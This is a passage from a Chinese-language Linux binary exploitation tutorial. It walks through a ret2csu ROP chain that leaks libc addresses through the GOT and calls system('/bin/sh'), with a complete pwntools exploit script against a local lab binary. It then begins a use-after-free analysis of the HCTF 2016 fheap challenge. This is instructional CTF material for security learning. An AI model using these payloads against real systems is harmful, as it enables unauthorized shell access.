2020/7/27 linux pwn⼊门学习到放弃
2.为什么不传递 "/bin/sh"的字符串地址到最后调⽤的system("/bin/sh"),⽽是
将"/bin/sh"写⼊ bss段？
因为这⾥rdi=r15d=param1 r15d 32-bit，所以不能传递给rdi 64-bit的
"/bin/sh" 字符串地址，所以必须写⼊到可写bss段，因为程序段就32-bit。
1 00007f76:f3c0bd57|2f 62 69 6e 2f 73 68 00 65 |/bin/sh
1 // /dev/stdin fd/0
2 // /dev/stdout fd/1
3 // /dev/stderr fd/2
总结:
1. 返回到 0x40061a 控制； rbx,rbp,r12,r13,r14,r15
2. 返回到 0x400600 执⾏， rdx=r13 rsi=r14 rdi=r15d call callq *
(%r12,%rbx,8)
3. 使 rbx=0 这样最后就可以 callq *(r12+rbx*8) = callq *(r12) ，然后构造rop使
之能执⾏任意函数；
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 22/36
2020/7/27 linux pwn⼊门学习到放弃
4. 需要泄露真实 libc.so 在内存中的地址才能拿到system_addr,才能getshell,那么
返回调⽤ got_write(rdi=1,rsi=got_write,rdx=8) ，从服务端返回write_addr，通
过write_addr减去 - write_static/libc.symbols['write']和
system_static/libc.symbols['system'] 的差值得到 system_addr，然后返
回到main重新开始，但并没有结束进程；
5. 返回调⽤got_read(rdi=0,bss_addr,16),相当于执⾏
got_read(rdi=0,bss_addr,8) , got_read(rdi=0,bss_addr+8,8) ,发送
system_addr,"/bin/sh",然后返回到main重新开始，但并没有结束进程；
6. 返回到bss_addr(bss_addr+8) -> system_addr(binsh_addr)
开始构造ROP
查看got表，
1 panda@ubuntu:~/Desktop/test$ objdump -R linux_x64_test3
2
3 linux_x64_test3: file format elf64-x86-64
4
5 DYNAMIC RELOCATION RECORDS
6 OFFSET TYPE VALUE
7 0000000000600ff8 R_X86_64_GLOB_DAT __gmon_start__
8 0000000000601018 R_X86_64_JUMP_SLOT write@GLIBC_2.2.5
9 0000000000601020 R_X86_64_JUMP_SLOT read@GLIBC_2.2.5
10 0000000000601028 R_X86_64_JUMP_SLOT __libc_start_main@GLIBC_2.2.5
然后利⽤代码如下:
1 #!/usr/bin/python
2 # -*- coding: UTF-8 -*-
3
4 from pwn import *
5
6 libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")
7 linux_x64_test3_elf = ELF("./linux_x64_test3")
8
9 # p = process("./linux_x64_test3")
10 p = remote("127.0.0.1",10001)
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 23/36
2020/7/27 linux pwn⼊门学习到放弃
11
12 pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40061a
13 print("[+] pop_rbx_rbp_r12_r13_r14_r15_ret = 0x%x" % pop_rbx_rbp_r12_r1
14 rdx_rsi_rdi_callr12_ret = 0x400600
15 print("[+] rdx_rsi_rdi_callr12_ret = 0x%x" % rdx_rsi_rdi_callr12_ret)
16
17 """
18 0000000000601018 R_X86_64_JUMP_SLOT write@GLIBC_2.2.5
19 0000000000601020 R_X86_64_JUMP_SLOT read@GLIBC_2.2.5
20 """
21 got_write =0x0000000000601018
22 print("[+] got_write = 0x%x" % got_write)
23
24 got_write2=linux_x64_test3_elf.got["write"]
25 print("[+] got_write2 = 0x%x" % got_write2)
26
27 got_read = 0x0000000000601020
28 got_read2=linux_x64_test3_elf.got["read"]
29
30 """
31 0000000000400587 :
32 400587: 55 push %rbp
33 """
34 main_static = 0x0000000000400587
35
36 # call got_write(rdi=1,rsi=got_write, rdx=8)
37 # rdi=r15d=param1 rsi=r14=param2 rdx=r13=param3 r12=call_address
38 payload1 ="A"*136 + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) # ret address
39 payload1 += p64(0)+ p64(1) # rbx=0 rbp=1
40 payload1 += p64(got_write) # call_address
41 payload1 += p64(8) # param3
42 payload1 += p64(got_write) # param2
43 payload1 += p64(1) # param1
44
45 payload1 += p64(rdx_rsi_rdi_callr12_ret) # call r12
46 payload1 += p64(0)*7 # add $0x8,
47 payload1 += p64(main_static) # return main
48
49 p.recvuntil('Hello, World\n')
50
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 24/36
2020/7/27 linux pwn⼊门学习到放弃
51 print("[+] send payload1 call got_write(rdi=1,rsi=got_write, rdx=8)")
52 p.send(payload1)
53 sleep(1)
54
55 write_addr = u64(p.recv(8))
56 print("[+] write_addr = 0x%x" % write_addr)
57
58 write_static = libc_elf.symbols['write']
59 system_static = libc_elf.symbols['system']
60
61 system_addr = write_addr - (write_static - system_static)
62 print("[+] system_addr = 0x%x" % system_addr)
63
64 """
65 [26] .bss NOBITS 0000000000601040 00001040
66 0000000000000008 0000000000000000 WA 0 0 1
67 """
68 bss_addr = 0x0000000000601040
69 bss_addr2 = linux_x64_test3_elf.bss()
70 print("[+] bss_addr = 0x%x" % bss_addr)
71 print("[+] bss_addr2 = 0x%x" % bss_addr2)
72
73 # call got_read(rdi=0,rsi=bss_addr, rdx=16)
74 # got_read(rdi=0,rsi=bss_addr, rdx=8) write system
75 # got_read(rdi=0,rsi=bss_addr+8, rdx=8) write /bin/sh
76 # rdi=r15d=param1 rsi=r14=param2 rdx=r13=param3 r12=call_address
77
78 payload2 = "A"*136 + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) # ret addr
79 payload2 += p64(0)+ p64(1) # rbx=0 rb
80 payload2 += p64(got_read) # call_add
81 payload2 += p64(16) # param3
82 payload2 += p64(bss_addr) # param2
83 payload2 += p64(0) # param1
84
85 payload2 += p64(rdx_rsi_rdi_callr12_ret) # call r12
86 payload2 += p64(0)*7 # add $
87 payload2 += p64(main_static)
88
89 p.recvuntil('Hello, World\n')
90
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 25/36
2020/7/27 linux pwn⼊门学习到放弃
91 print("[+] send payload2 call got_read(rdi=0,rsi=bss_addr, rdx=16)")
92
93 # raw_input()
94 p.send(payload2)
95 # raw_input()
96
97 p.send(p64(system_addr) + "/bin/sh\0") #send /bin/sh\0
98 """
99 00000000:00601040|00007f111b941390|........|
100 00000000:00601048|0068732f6e69622f|/bin/sh.|
101 """
102 sleep(1)
103 p.recvuntil('Hello, World\n')
104
105
106 # call bss_addr(rdi=bss_addr+8) system_addr(rdi=binsh_addr)
107 # rdi=r15d=param1 rsi=r14=param2 rdx=r13=param3 r12=call_address
108
109 payload3 ="A"*136 + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) # ret addr
110 payload3 += p64(0)+ p64(1) # rbx=0 rb
111 payload3 += p64(bss_addr) # call_add
112 payload3 += p64(0) # param3
113 payload3 += p64(0) # param2
114 payload3 += p64(bss_addr+8) # param1
115
116 payload3 += p64(rdx_rsi_rdi_callr12_ret) # call r12
117 payload3 += p64(0)*7 # add $0x8,%rsp 6 pop
118 payload3 += p64(main_static)
119
120 print("[+] send payload3 call system_addr(rdi=binsh_addr)")
121 p.send(payload3)
122 p.interactive()
实践4_释放后使⽤（Use-After-Free）学习
⽤ 2016HCTF_fheap作为学习⽬标，该题存在格式化字符漏洞和UAF漏洞。格式化字
符串函数可以接受可变数量的参数，并将第⼀个参数作为格式化字符串，根据其来解析
之后的参数。
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 26/36
2020/7/27 linux pwn⼊门学习到放弃
格式化字符漏洞是控制第⼀个参数可能导致任意地址读写。释放后使⽤（Use-After-
Free）漏洞是内存块被释放后，其对应的指针没有被设置为 NULL,再次申请内存块特
殊改写内存导致任意地址读或劫持控制流。
分析程序
checksec查询发现全开了，
1 Arch: amd64-64-little
2 RELRO: Partial RELRO
3 Stack: Canary found
4 NX: NX enabled
5 PIE: PIE enabled
程序很简单就3个操作，create,delete,quit。
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 27/36
2020/7/27 linux pwn⼊门学习到放弃
漏洞点
在delete操作上发现调⽤free指针函数释放结构后没有置结构指针为NULL,这样就能实
现UAF，如下图，
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 28/36
2020/7/27 linux pwn⼊门学习到放弃
create功能会先申请0x20字节的内存堆块存储结构，如果输⼊的字符串⻓度⼤于0xf，
则另外申请指定⻓度的空间存储数据，否则存储在之前申请的0x20字节的前16字节处，
在最后，会将相关free函数的地址存储在堆存储结构的后⼋字节处。
在create时全局结构指向我们申请的内存。
https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw 29/36
2020/7/27 linux pwn⼊门学习到放弃
这样就可以恶意构造结构数据,利⽤uaf覆盖旧数据结果的函数指针，打印出函数地址，
泄露出⼆进制base基址，主要逻辑如下:
1 create(4 创建old_chunk0 但是程序占位 old_chunk0_size=0x30 申请0x20
2 create(4 创建old_chunk1 但是程序占位 old_chunk1_size=0x30 申请0x20